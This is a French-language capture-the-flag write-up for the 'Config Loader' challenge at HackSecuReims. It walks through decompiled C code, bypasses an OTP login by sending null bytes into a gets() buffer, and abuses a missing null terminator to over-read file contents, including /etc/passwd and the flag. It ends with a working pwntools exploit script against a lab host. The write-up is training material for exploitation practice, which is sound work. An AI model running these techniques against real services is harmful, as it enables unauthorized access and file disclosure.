# hacksecureims

# Config Loader - HackSecuReims

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = 0;
  ignore_me_init_buffering(argc, argv, envp);
  print_banner();
  puts("Access restricted - You must log in first");
  sleep(1u);
  if ( !(unsigned int)login() )
  {
    puts("Unauthorized access detected - Exiting");
    exit(1);
  }
  while ( v4 != 6 )
  {
    print_menu();
    printf(">>>");
    __isoc99_scanf(" %d", &v4);
    fflush(stdin);
    if ( v4 <= 0 || v4 > 5 )
    {
      puts("Unknown action, exiting ... ");
      exit(1);
    }
    switch ( v4 )
    {
      case 1:
        check_ram();
        break;
      case 2:
        check_integrity();
        break;
      case 3:
        push_config();
        break;
      case 4:
        read_config();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid option..");
        break;
    }
  }
  return 0;
}
```

En analysant la fonction main on peut voir qu'il propose plusieurs choix via un menu. 

Avant d'afficher les différents choix nous devons nous connecter.

```c 
__int64 login()
{
  unsigned int v0; // eax
  int i; // [rsp+0h] [rbp-20h]
  char s1[8]; // [rsp+8h] [rbp-18h] BYREF
  char s[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, sizeof(s));
  memset(s1, 0, sizeof(s1));
  puts("[+] Generate and send OTP please wait..");
  sleep(2u);
  puts("[+] Done !");
  v0 = time(0LL);
  srand(v0);
  for ( i = 0; i <= 3; ++i )
    s[i] = rand() % 26 + 97;
  puts("access code:  ");
  gets(s1);
  if ( strcmp(s1, s) )
  {
    puts("[-] Access Denied\n");
    exit(1);
  }
  puts("[+] Access Granted");
  return 1LL;
}
```

J'ai vu l'utilisation de gets et de strcmp, j'ai donc bypass cette partie en remplissant le buffer avec des nullbytes.


Après avoir bypass le login j'ai check chaque fonction du menu et celle qui m'a interpelé c'est read_config.

```c 
__int64 read_config()
{
  int fd; // [rsp+Ch] [rbp-4h]

  memset(path, 0, sizeof(path));
  memset(content, 0, sizeof(content));
  puts("[+] File path:");
  read(0, path, 0x40uLL);
  path[strcspn(path, "\n")] = 0;
  fd = open(path, 0);
  if ( fd )
  {
    puts("[+] File exists, reading config..");
    read(fd, content, 0xFFFuLL);
    close(fd);
    content[strlen(content)] = 10;
    sleep(2u);
    puts("[+] Config stored in memory !");
    return 1LL;
  }
  else
  {
    puts("[-] Cannot open file..");
    return 0LL;
  }
}
```

Cette fonction permet à utilisateur de charger en mémoire le contenu d'un fichier depuis le serveur distant.

Une fois avoir chargé le contenu de flag.txt dans la mémoire j'ai tenté d'analyser les autres fonction pour voir si je pouvais avoir un arbitry read.

La seule fonction qui m'a interpelé était push_config.

```c 
__int64 push_config()
{
  puts("[!] Looking for configuration [!]");
  sleep(1u);
  puts("[+] . . .");
  sleep(2u);
  printf("[+] Found config file at %s\n", path);
  puts("[+] Sending configuration to remote beacon !");
  sleep(3u);
  puts("[+] Done !");
  return 42LL;
}
```

On peut voir en effet qu'il lit la variable path qui est aligné en mémoire avec la variable content dans le read_config.

Je suis donc retourné dans la fonction read_config et j'ai remarqué la présence de `path[strcspn(path, "\n")] = 0;`. En effet au moment ou je met le path il va automatiquement ajouter un null byte dès qu'il trouve un `\n`.

Nous allons profiter de ce bug de logique afin de over read, pour ce faire j'ai simplement remplis les 64 bytes du read dans path avec un chemin contenant plein de /

```
//////////////////////////////////////////////////////etc/passwd
```

En faisant cela aucun null byte ne sera ajouté au path et lorsque nous appelerons push_config il lira le contenu dans content.

Dans le consigne il est écrit que le flag est contenu dans le dossier de l'utilisateur qui execute le binaire. En lisant le etc/passwd j'ai pu trouver l'user et lire le flag dans son home.



```python=
from pwn import *


r = remote("10.22.6.20", 1337)


def bypass_otp(r):
    r.recvuntil(b"--- Settings console ---\n\nAccess restricted - You must log in first\n[+] Generate and send OTP please wait..\n[+] Done !\naccess code:")
    r.sendline(b"\x00"*8)

def print_menu(r):
    r.recvuntil(b"--- Menu ---\n\n1 - Check RAM\n\n2 - Check Integrity\n\n3 - Push Config\n\n4 - Load config\n\n5 - Exit console\n\n>>>")

def load_config(r, path):
    print_menu(r)
    r.sendline(b"4")
    r.sendline(path)



bypass_otp(r)

load_config(r, b"//////////////////////////////////////////////home/ghoztadm/flag")
r.interactive()
```
